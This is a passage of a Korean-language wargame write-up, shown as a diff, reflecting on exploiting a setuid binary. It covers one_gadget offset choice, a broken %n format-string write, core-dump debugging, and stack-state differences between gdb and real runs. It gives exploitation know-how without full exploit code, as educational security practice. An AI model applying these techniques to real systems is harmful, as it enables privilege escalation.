+#### one_gadget 후보를 무작정 바꿨다
 
 `%n` 버그를 모를 때는 "one_gadget 조건이 안 맞나?" 하고 `0xebbc8`, `0xebbc5`, `0xebc22`, `0xebc18`을 **계속 바꿔 끼웠다.** 전부 SIGSEGV. 사실 **원인은 one_gadget이 아니라 `%n` 쓰기 자체가 깨진 것**이었다. 코어 덤프의 `$pc`가 `printf_positional`을 가리킨 걸 보고서야 알았다.
 
 > 크래시 원인을 추측으로 때려맞히지 말고, **코어 덤프의 `$pc`(터진 명령 위치)를 먼저 봐야** 한다. "one_gadget 안에서 터졌나 / 쓰기 과정에서 터졌나"가 바로 갈린다.
 > 
 
-##### `0xebc18`은 "실행 시점"의 스택 상태에 의존한다
+#### `0xebc18`은 "실행 시점"의 스택 상태에 의존한다
 
 gdb(카피본, "AAAA" 입력)로 보면 `[rbp-0x78]=0`이라 `0xebc18`이 될 것 같았지만, **실제 실행에선 그 자리가 쓰레기값**이라 argv 역참조에서 터질 수 있었다. gdb(ASLR 꺼짐, 환경 다름) 상태 ≠ 실제 실행 상태였던 것.
 
 > one_gadget의 rbp-상대 조건은 **실행 시점의 스택 내용**에 민감하다. **rbp를 직접 조작할 수 있는 BOF**가 FSB보다 이 문제에선 훨씬 안정적이다 (FAKE_RBP로 조건 맞는 위치를 가리킬 수 있으니까).
 > 
 
-##### setuid 바이너리는 코어를 안 남긴다
+#### setuid 바이너리는 코어를 안 남긴다
 
 실제 `./final`(setuid)로는 코어 덤프가 안 나왔다. **카피본(`/tmp/final_dbg`, setuid 없음)**으로 돌려야 코어가 생긴다. 오프셋·레지스터는 코드·libc가 같으니 카피본으로 측정해도 그대로 유효하다. (`ulimit -c unlimited` + pwntools `p.corefile`로 수집)
 
 ---
 
-#### 7. 마치며
+### 7. 마치며
 
 보안 공부 중, 그나마 제일 많이 학습한 분야가 pwnable이다. 하지만, 드림핵같은 워게임을 학습할 때마다 벽에 가로막혔고 그 벽들은 대부분 PIE, ASLR, libc version 문제 등이였다. (물론, 내가 아직 실력이 부족한 것도 한 몫 한다.)
 하지만 이번 워게임 같은 경우, 마지막(final)을 제외하고는 no pie 위주이기도 했고 libc version 불일치로 크게 문제가 생기는 일도 없어서 내가 알고 있는 pwnable 개념들을 실습하며 잊혀진 기억들을 다시 복구하는 데에 정말 효과적이였다.
